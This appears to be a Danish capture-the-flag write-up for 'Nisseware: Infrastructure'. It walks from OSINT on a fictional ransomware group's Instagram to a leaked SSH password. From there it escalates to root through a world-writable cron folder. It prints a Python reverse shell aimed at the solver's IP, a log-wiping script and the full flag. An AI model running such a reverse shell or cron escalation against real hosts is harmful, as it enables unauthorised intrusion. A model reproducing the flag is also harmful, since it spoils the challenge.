# Writeup

`Nisseware: Infrastructure` er en forts√¶ttelse af [Nisseware: OSINT](../nisseware-osint/),
og her er det vigtigt at l√¶gge m√¶rke til sidste del af beskrivelsen: "*fandt du det hele? üëÄ*".

I OSINT-opgaven fandt vi frem til `HrM0rt3ns3n`s Twitter/X profil og derfra hans Mastodon.
Fra den fandt vi `n1ss3f4r`, som ogs√• havde en Mastodon.social profil, men vigtigere ledte denne til hans Infosec Exchange profil: https://infosec.exchange/@n1ss3f4r

Her er is√¶r det nyeste post relevant:

![Nissefars post om andre profiler](img/nissefar-infosec.png)

Her hintes til, at `n1ss3f4r` har profiler p√• andre medier, specifikt nogle af de √¶ldre end Mastodon, der jo stadig er relativt ny.

En god start er at tjekke `WhatsMyName` igen og nu lave en s√∏gning p√• `n1ss3f4r`:

![WhatsMyName resultat for nissefar](img/whatsmyname.png)

Hmm, den finder dog kun `mastodon.social`, ikke engang `infosec.exchange`. Den finder ogs√• en `Apex Legends` gamingprofil, men den er unclaimed og n√¶sten tom - h√∏jest sandsynligt en falsk positiv.
Vi kan ogs√• fors√∏ge med `sherlock`, der dog heller ikke finder noget interessant. Andre tools kan ogs√• fors√∏ges, men ellers er det bare at g√• manuelt til v√¶rks, for de fleste tools vil have en del b√•de falske positiver og mangler.

Det er altid en god id√© i OSINT-challenges at pr√∏ve kendte usernames af p√• de mest almindelige sociale netv√¶rk og andre relevante sider som `Facebook`, `YouTube`, `Instagram`, `Twitter`, `GitHub`, `TikTok` osv. - lige her falder `TikTok` m√•ske ikke helt inden for "gode gamle netv√¶rk", men det kunne de resterende sagtens, og disse b√∏r alle tjekkes manuelt.

G√∏res dette, vil man opdage, at `n1ss3f4r` har en Instagram konto: https://www.instagram.com/n1ss3f4r.

![Nissefars Instagram profil](img/nissefar-instagram-profil.png)

Han har faktisk en del interessante posts:

![Nissefars Instagram posts](img/instagram-posts.png)

Is√¶r √©t stikker dog tydeligt ud fra de resterende:

![Nissefars leak](img/nissefar-leak-full.png)

Zoomer vi mere ind ses, at der i venstre side af hans sk√¶rm er et `Visual Studio Code` vindue √•bent, hvor han sidder og udvikler p√• `VBA`-koden fra [Nisseware: Phishing](../nisseware-phishing/).
Vigtigere til h√∏jre ses et terminalvindue samt en mail fra `HrM0rt3ns3n`:

![Nissefars terminal](img/insta-term.png)

![Nissefars mail](img/insta-mail.png)

I mailen st√•r:

```
Godmorgen nissefar!

Jeg har som aftalt sat ny C2-server op, den burde v√¶re good to go.
Du kan forbinde via SSH til n1ss3b4nd3n.jul med dit normale handle og passwordet:
HyphypAlleMine9R3nsdyr!

Har smidt et par scripts p√• til automatisk fetch af nye ransom betalinger og til at wipe logs regelm√¶ssigt,
s√• du skal ikke v√¶re s√• nerv√∏s for, hvordan du bruger maskinen.
Vi skal n√∏dig ende i samme situation som sidst, sp√¶ndende hvorn√•r Sk1pp3r kommer ud igen...

/Hr. M0rt3ns3n
```

Fedt! Et tydeligt leak af b√•de serveren `n1ss3b4nd3n.jul` og hans password `HyphypAlleMine9R3nsdyr!`.
I terminalen kan man se, at `n1ss3f4r` connecter med `ssh n1ss3f4r@n1ss3b4nd3n.jul` og kommer ind p√• serveren.

Nu kan vi infiltrere `N1ss3b4nd3n`s server og f√• adgang til `n1ss3f4r`s profil!
Serveren k√∏rer via [Haaukins](https://ncctf.haaukins.dk) og kr√¶ver, man lige s√¶tter et `VPN`- eller browserlab op, hvorefter vi kan logge ind med samme command og password som `n1ss3f4r`.

Her finder vi f√∏rste halvdel af flaget i `flag_user.txt`: `NC3{N1ss3b4nd3ns_53rv3r`

![Initial server access](img/server-initial-access.png)

Der ligger ogs√• VBA-scriptet og det ondsindede regneark fra [Nisseware: Phishing](../nisseware-phishing/) samt en `payloads/` mappe med tre af gruppens payloads, som ogs√• ligger i deres pastebin.
Alts√• kan man i princippet l√∏se [Nisseware: Loading](../nisseware-loading/) nu, hvis man tidligere fandt frem til pastebin og den offentlige paste med medlemslisten, men missede, at man kunne tilg√• GitHub repoet og commit history, der ellers ledte til scriptet med flag.

Sidst ligger i hjemmemappen f√∏lgende `todo.txt`:

```md
# TODO

- F√∏lg op p√• seneste angreb (Leget√∏j"–Ø"Os)
  - Monitorer overf√∏rsel af ransom
  - Gennemg√• eksfiltrerede dokumenter med prototyper, s√¶t i produktion eller s√¶lg
- Forbedr script til monitorering af nye ransomoverf√∏rsler
- Husk tandl√¶getid
- Forbered nisserne p√• ny fyringsrunde
- Find nye targets i leget√∏jsbranchen
- Tjek op p√• serverens sikkerhed, b√∏r muligvis h√¶rdes lidt
```

Meget tydeligt tegn p√•, de st√•r bag det efterforskede angreb og lidt hints til, hvad de mon eksfiltrerede, hvis man ikke har l√∏st [Nisseware: Exfiltration](../nisseware-exfiltration/) endnu.
Samtidig virker der til at v√¶re noget monitoreringsscript og m√•ske nogle sikkerhedshuller p√• serveren.

Tid til enumeration! En hurtig `ls /` viser, at der ligger en mappe, der ikke plejer, nemlig `data`:

```console
$ ls /
bin  boot  data  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Lad os unders√∏ge, hvad den indeholder:

```console
$ ls /data/
payments.txt
```

```console
$ cat payments.txt 
2023-11-27 13:45:01+00:00
cc9a47154a1e7dbdf20e5909edeec089:  16.33 ETH

2023-11-27 21:25:01+00:00
8a24d712e90da50022256b9c455e7c23:  18.36 ETH

2023-11-28 15:40:01+00:00
6cf760aab7ed41e5bded1bc939da7bab:  3.48 ETH

2023-11-28 18:05:01+00:00
75b76a16a8f053e0b93048dcc35724ec:  11.02 ETH
79a7cbf05bb959a956a654424eca0114:  26.64 ETH

2023-11-29 08:50:01+00:00
26f3b9e0337b3dee58f8c3441854f7b2:  30.98 ETH

2023-11-30 09:15:01+00:00
fde4f5eb29cc1fa313dd4add2e39bd8f:  4.26 ETH
1920316f574bbce48891b3556cdae767:  19.72 ETH

2023-11-30 12:30:01+00:00
a4f7de91cbc3b70eb500b74ba093369f:  12.37 ETH
```

Hmm, det virker som indkommende betalinger, sandsynligvis l√∏sesummer fra `N1ss3b4nd3n`s angreb, m√•ske det er dem, der hentes ned med det n√¶vnte monitoreringsscript?

En god enumereringstaktik er at k√∏re et automatisk script som [linpeas.sh](https://linpeas.sh/), der tjekker for de mest almindelige s√•rbarheder og mulige indgangsvinkler.
Man kan dog ogs√• g√• manuelt til v√¶rks, da det ikke er t√¶nkt som en sv√¶r `boot2root` maskine.

Der er `sudo` p√• maskinen, men `n1ss3f4r` har ikke `sudo`-rettigheder:

```console
$ sudo -l
Sorry, user n1ss3f4r may not run sudo on n1ss3b4nd3n
```

Tjekker vi k√∏rende processer med `top`, kan vi se en r√¶kke processer i stil med f√∏lgende:

```console
$ top

PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
  1 root      20   0    2888    968    872 S   0.0   0.0   0:00.03 sh
  7 root      20   0    4360   3248   3008 S   0.0   0.0   0:00.00 startup.sh
  9 root      20   0    3884   1980   1796 S   0.0   0.0   0:00.00 cron
 11 root      20   0   15420   8840   7264 S   0.0   0.0   0:00.00 sshd
 12 root      20   0   16716  10588   8704 S   0.0   0.0   0:00.08 sshd
 23 n1ss3f4r  20   0   16976   7776   5628 S   0.0   0.0   0:00.01 sshd
 24 n1ss3f4r  20   0    5044   4052   3448 S   0.0   0.0   0:00.00 bash
 30 n1ss3f4r  20   0    7744   3604   3012 R   0.0   0.0   0:00.02 top
```

Mest interessant er her, at der k√∏res `cron`, det er klart v√¶rd at udforske yderligere, is√¶r fordi det k√∏rer som `root`!

At det k√∏rer som `root` betyder, at vi ikke kan se info p√• det med en `crontab` fra `n1ss3f4r`s profil - den eksisterer slet ikke:

```console
$ crontab -l
no crontab for n1ss3f4r
```

Vi kigger i stedet i de relevante mapper i `/etc` og ser, om der ligger noget brugbart:

```console
$ ls /etc/cron.d
e2scrub_all  run_scripts
```

`e2scrub_all` er standard og tjekker bare for problemer i logiske volumes, men `run_scripts` ser custom og interessant ud!

```console
$ cat /etc/cron.d/run_scripts 
*/5 * * * * root /bin/bash /root/run_all.sh /usr/scheduled
```

Okay, s√• hvert 5. minut k√∏res `/root/run_all.sh /usr/scheduled` som `root`, det skal klart udforskes.
Vi har ikke rettigheder til at kigge i `/root`, men navnet tyder jo p√•, at scriptet bare k√∏rer alle scripts i `/usr/scheduled`, s√• vi unders√∏ger indholdet af denne mappe:

```console
$ ls -la /usr/scheduled/
total 16
drwxrwxrwx 1 root root 4096 Nov 29 11:20 .
drwxr-xr-x 1 root root 4096 Nov 29 11:20 ..
-rwx------ 1 root root  110 Nov 29 11:19 delete_logs.sh
-rwx------ 1 root root  594 Nov 29 11:19 fetch_new_payments.sh
```

`delete_logs.sh` er nok et script til at slette relevante logs hvert 5. minut, og `fetch_new_payments.sh` henter nok nye l√∏sesumsbetalinger ind i `/data/payments.txt`.
Vi kan ikke verificere disse hypoteser, da begge scripts kun er l√¶sbare af `root`, men vi kan m√•ske f√• lov at k√∏re vores eget script, og s√• vil det jo k√∏re som `root`!

Der er mange mulige veje frem her - en af de simpleste vil v√¶re et script, der bare kopierer indholdet af `/flag_root.txt` til en fil i en tilg√¶ngelig mappe.
En lidt mere generel l√∏sning, der ogs√• giver adgang til andre potentielle filer, er dog at k√∏re en reverse shell.

Id√©en er at s√¶tte en `netcat` listener op p√• vores lokale maskine med fx `nc -lvnp 4000` og k√∏re et script fra serveren, der connecter til *vores* maskine p√• port `4000` og giver os en shell tilbage ind p√• serveren (derfor *reverse* shell). Siden https://revshells.com er super god til dette form√•l og har en lang r√¶kke templates til forskellige reverse shells, hvor IP, port, shell type og encoding nemt kan √¶ndres interaktivt:

![Screenshot af siden revshells.com](img/revshell.png)

N√•r vi finder et reverse shell, der virker lovende, kan vi som en start pr√∏ve at k√∏re det som kommando direkte fra `n1ss3f4r`s profil og se, om vi f√•r adgang til serveren med denne bruger.
Hvis dette virker, kan vi skrive det ned i et script i `/usr/scheduled/` og vente p√•, det afvikles, s√• b√∏r vi f√• en `root` shell.

√àn mulighed er et standard `bash` reverse shell, men serveren har ogs√• `Python 3` installeret, s√• vi kan bruge et klassisk `python3` revshell i stedet.
Vi skriver f√∏lgende til `/usr/scheduled/shell.sh` med vores egen maskines IP indsat:

```bash
#!/bin/bash
export RHOST="<DIN-LOKALE-IP>"
export RPORT=4000
python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Der er ikke `nano` p√• maskinen, men man kan bruge `vim` eller bare redirecte det ind med `echo`.

Herefter er det bare at vente i max 5 minutter, og s√• er der `root` shell!

![Root shell](img/root-shell.png)

Her ser vi bl.a. `flag_root.txt`, som indeholder anden og sidste del af flaget: `_1nf1ltr3r3t_g00d_j0b!}`.
De kan samles til `NC3{N1ss3b4nd3ns_53rv3r_1nf1ltr3r3t_g00d_j0b!}`, og vi har nu l√∏st opgaven og skaffet fuld access til `N1ss3b4nd3n`s server!

Du er n√•et til √©n af seriens prim√¶re end goals: disruption af gruppen og takedown af deres server. Har du endnu ikke analyseret C2-trafikken og/eller ransomwaren, kan du forts√¶tte med end goalet "dekryptering" fra og med [Nisseware: Exfiltration](../nisseware-exfiltration/) eller m√•ske g√• ad kryptovejen i [Nisseware: Ransom](../nisseware-ransom/).

## Bonus!

Du har f√•et fuld adgang til serveren, s√• hvorfor ikke lige unders√∏ge de resterende og tidligere ul√¶selige filer!

Der ligger en `c2/` mappe og en `nisseware/` mappe i `/root/` med en r√¶kke af gruppens filer!

`c2/` indeholder som easter egg serverkoden for `c2`-frameworket, hvor man ellers kun har kunne se klienten i netv√¶rkstrafikken.
Herudover ligger `c2/uploads`, hvor det tydeligt ses, at `N1ss3b4nd3n` har eksfiltreret filer fra leget√∏jsfirmaet - desv√¶rre ikke den med flaget fra [Nisseware: Exfiltration](../nisseware-exfiltration/), den har de √•benbart slettet igen üòâ

I `nisseware/` mappen ligger den faktiske ransomware, nemlig filen `AntiVirusInstaller.exe` samt ransomnoten `instructions.hta`.
Denne ransomware er ellers sendt krypteret af C2-serveren og kr√¶ver, man l√∏ser [Nisseware: Exfiltration](../nisseware-exfiltration/), s√• den kan dekrypteres,
men n√•r man helt hertil f√∏rst, er der alts√• givet en alternativ genvej ind i [Nisseware: Dropper](../nisseware-dropper/), hvor man kan springe noget reversing og crypto over.

Til de nysgerrige kan vi nu ogs√• l√¶se `run_all.sh`:

```sh
#!/bin/bash
for file in $1/*
do
    /bin/bash "$file"
done
```

samt de to scripts i `/usr/scheduled`, f√∏rst `delete_logs.sh`:

```sh
#!/bin/bash
truncate -s 0 /root/.bash_history
truncate -s 0 /home/*/.bash_history
truncate -s 0 /var/log/*log
```

og s√• `fetch_new_payments.sh`, hvor der muligvis er snydt lidt og bare simuleret nye overf√∏rsler til `payments.txt`:

```sh
#!/bin/bash

# Vent, s√• payment scriptet var bare simuleret, det hele er fake???
# ùòàùò≠ùò∏ùò¢ùò∫ùò¥ ùò©ùò¢ùò¥ ùò£ùò¶ùò¶ùòØ
# üåç  üë®‚ÄçüöÄüî´üë®‚ÄçüöÄ
r=$(shuf -i 0-10 -n 1)
if [ $r -gt 9 ]
then
    count=2
elif [ $r -gt 6 ]
then
    count=1
else
    count=0
fi

if [ $count -gt 0 ]
then
    date -u --rfc-3339=seconds >> /data/payments.txt
fi

for i in $(seq $count)
do
    echo "$(date -u --rfc-3339=ns | md5sum | awk '{print $1}'):  $((1 + RANDOM % 20)).$((RANDOM % 100)) ETH" >> /data/payments.txt
done

if [ $count -gt 0 ]
then
    echo "" >> /data/payments.txt
fi
```

S√• er der vist heller ikke flere easter eggs at hente i den opgave üòÉ

Til dem, der ikke fandt Instagram kontoen eller ikke var interesseret i at oprette en profil, kan man se alle `n1ss3f4rs` fine posts her:

![Nissefars Instagram post 1](img/insta-1.png)

![Nissefars Instagram post 2](img/insta-2.png)

![Nissefars Instagram post 3](img/insta-3.png)

![Nissefars Instagram post 4](img/insta-4.png)

![Nissefars Instagram post 5](img/insta-5.png)

![Nissefars Instagram post 6](img/insta-6.png)

![Nissefars Instagram post 7](img/insta-7.png)

![Nissefars Instagram post 8](img/insta-8.png)

![Nissefars Instagram post 9](img/insta-9.png)

![Nissefars Instagram post 10](img/insta-10.png)

![Nissefars Instagram post 11](img/insta-11.png)

![Nissefars Instagram post 12](img/insta-12.png)

**Flag**

`NC3{N1ss3b4nd3ns_53rv3r_1nf1ltr3r3t_g00d_j0b!}`
